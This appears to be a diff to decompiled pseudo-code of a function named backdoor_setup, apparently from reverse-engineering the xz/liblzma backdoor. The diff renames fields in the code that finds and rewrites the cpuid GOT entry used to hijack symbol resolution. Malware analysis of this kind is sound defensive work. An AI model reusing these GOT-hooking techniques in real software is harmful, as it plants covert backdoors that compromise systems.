@@ -132,9 +132,9 @@ BOOL backdoor_setup(backdoor_setup_params_t *params)
   local_980.data_handle.runtime_data = &local_980;
   local_980.data_handle.cached_elf_handles = elf_handles;
   update_got_address(peVar49);
-  code_segment = (peVar49->got_ctx).got_ptr;
+  code_segment = (peVar49->got_ctx).tls_got_entry;
   if (code_segment != (void *)0x0) {
-    cpuid_got_entry = *(u64 **)((long)code_segment + (long)(peVar49->got_ctx).cpuid_fn * 8 + 0x18);
+    cpuid_got_entry = *(u64 **)((long)code_segment + (peVar49->got_ctx).cpuid_slot_index * 8 + 0x18);
     frame_address = peVar49->resolver_frame;
     loop_idx = (long)frame_address - (long)cpuid_got_entry;
     if (frame_address <= cpuid_got_entry) {
@@ -872,10 +872,10 @@ LAB_00105a60:
   }
 LAB_00105a81:
   peVar49 = params->entry_ctx;
-  (peVar49->got_ctx).got_ptr = (void *)0x0;
-  (peVar49->got_ctx).return_address = (void *)0x0;
-  (peVar49->got_ctx).cpuid_fn = (void *)0x0;
-  (peVar49->got_ctx).got_offset = 0;
+  (peVar49->got_ctx).tls_got_entry = (void *)0x0;
+  (peVar49->got_ctx).cpuid_got_slot = (void *)0x0;
+  (peVar49->got_ctx).cpuid_slot_index = 0;
+  (peVar49->got_ctx).got_base_offset = 0;
   peVar49->cpuid_random_symbol_addr = (void *)0x1;
   tls_slot = (int *)cpuid_basic_info(0);
   if (*tls_slot != 0) {
@@ -883,10 +883,10 @@ LAB_00105a81:
     resolved_mask0 = resolved_count_cursor[1];
     resolved_mask1 = resolved_count_cursor[2];
     resolved_mask2 = resolved_count_cursor[3];
-    *(undefined4 *)&(peVar49->got_ctx).got_ptr = *resolved_count_cursor;
-    *(undefined4 *)&(peVar49->got_ctx).return_address = resolved_mask0;
-    *(undefined4 *)&(peVar49->got_ctx).cpuid_fn = resolved_mask2;
-    *(undefined4 *)&(peVar49->got_ctx).got_offset = resolved_mask1;
+    *(undefined4 *)&(peVar49->got_ctx).tls_got_entry = *resolved_count_cursor;
+    *(undefined4 *)&(peVar49->got_ctx).cpuid_got_slot = resolved_mask0;
+    *(undefined4 *)&(peVar49->got_ctx).cpuid_slot_index = resolved_mask2;
+    *(undefined4 *)&(peVar49->got_ctx).got_base_offset = resolved_mask1;
   }
   return FALSE;
 }
